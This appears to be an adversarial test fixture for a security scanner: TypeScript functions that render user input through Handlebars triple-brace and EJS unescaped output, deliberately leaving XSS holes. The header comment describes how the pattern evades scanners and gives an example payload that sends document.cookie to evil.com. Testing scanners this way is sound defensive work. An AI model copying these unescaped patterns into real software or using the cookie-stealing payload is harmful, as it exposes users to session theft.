/**
 * ADVERSARIAL FIXTURE: XSS via Template Engine Unescaped Rendering
 *
 * Vulnerability: User input rendered without escaping through a
 * template engine's "raw" / "unescaped" output syntax
 * Evasion technique: The XSS doesn't happen via direct DOM manipulation.
 * Instead, user data is passed to a template engine using triple-brace
 * syntax {{{html}}} which disables auto-escaping. Scanners looking for
 * innerHTML, dangerouslySetInnerHTML, or DOM APIs won't catch this
 * server-side rendering pattern.
 *
 * Exploit: userInput = '<script>document.location="https://evil.com?"+document.cookie</script>'
 */

interface TemplateEngine {
  compile(source: string): (data: Record<string, unknown>) => string;
  render(template: string, data: Record<string, unknown>): string;
}

declare const handlebars: TemplateEngine;

export function renderUserProfile(userData: {
  name: string;
  bio: string;
  website: string;
}) {
  const template = `
    <div class="profile">
      <h2>{{name}}</h2>
      <div class="bio">{{{bio}}}</div>
      <a href="{{{website}}}">Website</a>
    </div>
  `;

  return handlebars.render(template, userData);
}

export function renderEmailTemplate(
  recipientName: string,
  htmlContent: string,
) {
  const emailTemplate = `
    <html>
      <body>
        <p>Hello {{recipientName}},</p>
        <div class="content">{{{htmlContent}}}</div>
        <footer>Sent by our app</footer>
      </body>
    </html>
  `;

  return handlebars.render(emailTemplate, { recipientName, htmlContent });
}

interface EjsLike {
  render(template: string, data: Record<string, unknown>): string;
}

declare const ejs: EjsLike;

export function renderDashboard(widgetHtml: string, userName: string) {
  const template = `
    <div class="dashboard">
      <h1>Welcome, <%= userName %></h1>
      <div class="widgets"><%- widgetHtml %></div>
    </div>
  `;

  return ejs.render(template, { userName, widgetHtml });
}

export function renderMarkdown(userMarkdown: string) {
  const rendered = userMarkdown
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

  // BUG: the rendered output is then passed as unescaped HTML
  const template = `<div class="markdown-body">{{{content}}}</div>`;
  return handlebars.render(template, { content: rendered });
}
